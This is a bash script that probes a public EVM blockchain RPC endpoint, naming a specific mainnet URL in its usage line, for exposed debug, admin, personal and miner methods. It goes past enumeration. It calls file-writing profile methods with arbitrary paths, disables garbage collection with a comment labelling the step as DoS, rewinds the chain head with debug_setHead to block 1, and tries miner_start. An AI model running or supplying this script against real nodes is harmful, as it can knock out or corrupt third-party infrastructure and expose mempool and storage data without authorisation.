#!/usr/bin/env bash
# l1-rpc-debug-probe.sh — enumerate exposed debug/txpool/admin namespaces on an EVM L1 public RPC.
# Usage: ./l1-rpc-debug-probe.sh https://rpc-mainnet.uniultra.xyz
# Success oracle: JSON-RPC "result" (esp. null) = method exists & executed. -32601 = not exposed. -32602 = exists, needs args.
RPC="${1:?usage: $0 <rpc-url>}"
CT='Content-Type: application/json'
j() { printf '{"jsonrpc":"2.0","method":"%s","params":%s,"id":1}' "$1" "$2"; }

echo "== rpc_modules (enumerate exposed namespaces) =="
curl -sX POST "$RPC" -H "$CT" -d "$(j rpc_modules '[]')"; echo

echo; echo "== no-arg info/disclosure methods =="
for m in txpool_content debug_stacks debug_memStats debug_gcStats debug_freeOSMemory web3_clientVersion net_version; do
  printf '%-24s ' "$m"
  curl -sX POST "$RPC" -H "$CT" -d "$(j "$m" '[]')" | head -c 200; echo
done

echo; echo "== file-write methods (arbitrary path — use /tmp canary) =="
CANARY="/tmp/rpc_probe_$(date +%s)"
for m in debug_writeMemProfile debug_writeBlockProfile debug_writeMutexProfile; do
  printf '%-28s ' "$m -> $CANARY"
  curl -sX POST "$RPC" -H "$CT" -d "$(j "$m" "[\"$CANARY\"]")"; echo
done
# cpu/trace/block take (file, seconds)
for m in debug_cpuProfile debug_goTrace debug_blockProfile debug_mutexProfile; do
  printf '%-28s ' "$m -> $CANARY (1s)"
  curl -sX POST "$RPC" -H "$CT" -d "$(j "$m" "[\"$CANARY\",1]")"; echo
done

echo; echo "== state manipulation (DoS / control) =="
printf '%-24s ' debug_setGCPercent;  curl -sX POST "$RPC" -H "$CT" -d "$(j debug_setGCPercent '[-1]')"; echo
printf '%-24s ' debug_verbosity;     curl -sX POST "$RPC" -H "$CT" -d "$(j debug_verbosity '[6]')"; echo
printf '%-24s ' debug_backtraceAt;   curl -sX POST "$RPC" -H "$CT" -d "$(j debug_backtraceAt '["main.go:1"]')"; echo
printf '%-24s ' debug_setHead;       curl -sX POST "$RPC" -H "$CT" -d "$(j debug_setHead '["0x1"]')"; echo

echo; echo "== traceCall storage oracle (prestateTracer on a contract) =="
curl -sX POST "$RPC" -H "$CT" -d "$(j debug_traceCall '[{"to":"0xfc00face00000000000000000000000000000000","data":"0x"},"latest",{"tracer":"prestateTracer"}]')" | head -c 400; echo

echo; echo "== dangerous-but-usually-blocked =="
for m in admin_nodeInfo admin_peers personal_listAccounts miner_start; do
  printf '%-24s ' "$m"; curl -sX POST "$RPC" -H "$CT" -d "$(j "$m" '[]')" | head -c 120; echo
done
